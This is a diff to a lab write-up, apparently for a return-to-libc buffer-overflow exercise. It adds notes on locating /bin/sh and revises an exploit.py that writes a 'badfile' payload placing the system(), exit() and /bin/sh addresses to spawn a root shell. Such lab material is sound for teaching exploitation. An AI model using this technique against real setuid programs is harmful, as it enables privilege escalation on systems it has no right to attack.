@@ -53,7 +53,9 @@ void main()
 gcc envaddr.c -o env666
 ```
 
-The address of `\bin\sh` is `0xbffffdef`.
+The address of `/bin/sh` is `0xbffffdef`.
+
+**Note**: Don't use `gdb` to get the address of string `/bin/sh` in `libc`. Beacause `gbd` will inject something to the stack and heap for debugging, so the address probably become different in runtime.
 
 # Task 4
 
@@ -88,24 +90,31 @@ So, the distance between `%ebp` and `&buffer` inside the function `bof` is 20 by
 Compose `exploit.py` as follows:
 
 ```py
+#!/usr/bin/python3
 import sys
 
 # Fill content with non-zero values
-content = bytearray(0xaa for i in range(300))
+content = bytearray(0xaa for i in range(40)) #**Note**: it must be modified there. the origin length of     `content` is 300, which may cause `retlib` return directly without launching a root shell. Please change the length to a smaller int.
 
 X = 32
-sh_addr = 0xbffffdef       # The address of "/bin/sh"
-content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')
+sh_addr = 0xbffffdef      # The address of "/bin/sh"
+content[X:X+4] = (sh_addr).to_bytes(4, byteorder='little')
 
 Y = 24
 system_addr = 0xb7e42da0  # The address of system()
-content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')
+content[Y:Y+4] = (system_addr).to_bytes(4, byteorder='little')
 
 Z = 28
-exit_addr = 0xb7e369d0    # The address of exit()
-content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')
+exit_addr = 0xb7e369d0  # The address of exit()
+content[Z:Z+4] = (exit_addr).to_bytes(4, byteorder='little')
 
 # Save content to a file
 with open("badfile", "wb") as f:
-  f.write(content)
+    f.write(content)
 ```
+
+**Note**: in the line 5, the length of `content` should be set to a smaller number instead of 300 both in the templete and source code offered by the official site. 
+
+Finally I can get
+
+![](root_shell.png)
